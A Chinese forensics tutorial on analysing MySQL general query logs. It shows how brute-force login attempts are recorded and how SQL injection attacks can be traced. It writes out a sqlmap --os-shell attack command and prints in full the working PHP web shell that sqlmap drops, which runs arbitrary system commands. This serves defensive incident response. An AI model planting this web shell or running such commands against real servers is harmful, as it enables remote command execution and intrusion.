## 第5篇:MySQL日志分析

常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。

对数据库的日志进行分析，可以发现攻击行为，追溯攻击源，进而还原攻击场景。

### 0x01 Mysql日志分析

general query log能记录成功连接和每次执行的查询，我们可以将它用作安全布防的一部分，为故障分析或黑客事件后的调查提供依据。

~~~
1、查看log配置信息
show variables like '%general%';
2、开启日志
SET GLOBAL general_log = 'On';
3、指定日志文件路径
#SET GLOBAL general_log_file = '/var/lib/mysql/mysql.log';
~~~

我们来做个简单的测试吧，使用我以前自己开发的弱口令工具来扫一下，字典设置比较小，2个用户，4个密码，共8组。

![](./image/log-5-1.png)

MySQL中的log记录是这样子：

Time                 Id        Command         Argument

190601 22:03:20	   98 Connect	root@192.168.204.1 on 
		   98 Connect	Access denied for user 'root'@'192.168.204.1' (using password: YES)
		  103 Connect	mysql@192.168.204.1 on 
		  103 Connect	Access denied for user 'mysql'@'192.168.204.1' (using password: YES)
		  104 Connect	mysql@192.168.204.1 on 
		  104 Connect	Access denied for user 'mysql'@'192.168.204.1' (using password: YES)
		  100 Connect	root@192.168.204.1 on 
		  101 Connect	root@192.168.204.1 on 
		  101 Connect	Access denied for user 'root'@'192.168.204.1' (using password: YES)
		   99 Connect	root@192.168.204.1 on 
		   99 Connect	Access denied for user 'root'@'192.168.204.1' (using password: YES)
		  105 Connect	mysql@192.168.204.1 on 
		  105 Connect	Access denied for user 'mysql'@'192.168.204.1' (using password: YES)
		  100 Query	set autocommit=0
		  102 Connect	mysql@192.168.204.1 on 
		  102 Connect	Access denied for user 'mysql'@'192.168.204.1' (using password: YES)
		  100 Quit	`

我们来按列来解析:

~~~
第一列:Time，时间列，前面一个是日期,后面一个是小时和分钟，有一些不显示的原因是因为这些sql语句几乎是同时执行的,所以就不另外记录时间了。
第二列:Id，就是show processlist出来的第一列的线程ID,对于长连接和一些比较耗时的sql语句,你可以精确找出究竟是那一条那一个线程在运行。
第三列:Command，操作类型，比如Connect就是连接数据库，Query就是查询数据库(增删查改都显示为查询)，可以特定过虑一些操作。
第四列:Argument，详细信息，例如 Connect   root@192.168.204.1 on test  意思就是root@192.168.204.1连上test库，如此类推,接下面的连上数据库之后,做了什么查询的操作。
~~~

你知道在这个口令猜解过程中，哪个是成功的，哪个是失败的吗？

一个口令猜解成功的记录是这样子的：

~~~
190601 22:03:20     100 Connect	root@192.168.204.1 on 
	   100 Query	set autocommit=0
	   100 Quit
~~~

但是，如果你是用其他方式，可能会有一点点不一样的哦。

~~~
Navicat for MySQL登录：
190601 22:14:07	  106 Connect	root@192.168.204.1 on 
		         106 Query	SET NAMES utf8
		         106 Query	SHOW VARIABLES LIKE 'lower_case_%'
		         106 Query	SHOW VARIABLES LIKE 'profiling'
		         106 Query	SHOW DATABASES

命令行登录：
190601 22:17:25	  111 Connect	root@localhost on 
		         111 Query	select @@version_comment limit 1
190601 22:17:56	  111 Quit

~~~

通过这样的方式，我们可以简单判断出用户是通过连接数据库的方式。

登录失败的记录：

~~~
102 Connect	mysql@192.168.204.1 on 
102 Connect	Access denied for user 'mysql'@'192.168.204.1' (using password: YES)
~~~

当然啦，不管你是爆破工具、Navicat for MySQL、还是命令行，登录失败都是一样的记录。

利用shell命令进行简单的分析：

~~~
#有哪些IP在爆破？
grep  "Access denied" mysql.log |cut -d "'" -f4|uniq -c|sort -nr
     27 192.168.204.1

#爆破用户名字典都有哪些？
grep  "Access denied" mysql.log |cut -d "'" -f2|uniq -c|sort -nr
     13 mysql
     12 root
      1 root
      1 mysql

~~~

### 0x02  SQL注入入侵痕迹

在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的--os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：

1、构造一个SQL注入点，开启Burp监听8080端口

`sqlmap.py  -u http://192.168.204.164/sql.php?id=1 --os-shell --proxy=http://127.0.0.1:8080`

HTTP通讯过程如下：

![](./image/log-5-3.png)

创建了一个临时文件tmpbwyov.php，通过访问这个木马执行系统命令，并返回到页面展示。

tmpbwyov.php：

<?php $c=$_REQUEST["cmd"];@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);$z=@ini_get('disable_functions');if(!empty($z)){$z=preg_replace('/[, ]+/',',',$z);$z=explode(',',$z);$z=array_map('trim',$z);}else{$z=array();}$c=$c." 2>&1\n";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print "<pre>".$w."</pre>";?>`

创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。

通过查看网站目录中最近新建的可疑文件，可以判断是否发生过sql注入漏洞攻击事件。

检查方法：

1、检查网站目录下，是否存在一些木马文件：

![](./image/log-5-4.png)

2、检查是否有UDF提权、MOF提权痕迹

检查目录是否有异常文件

mysql\lib\plugin 

c:/windows/system32/wbem/mof/

检查函数是否删除

`select * from mysql.func`

3、结合web日志分析。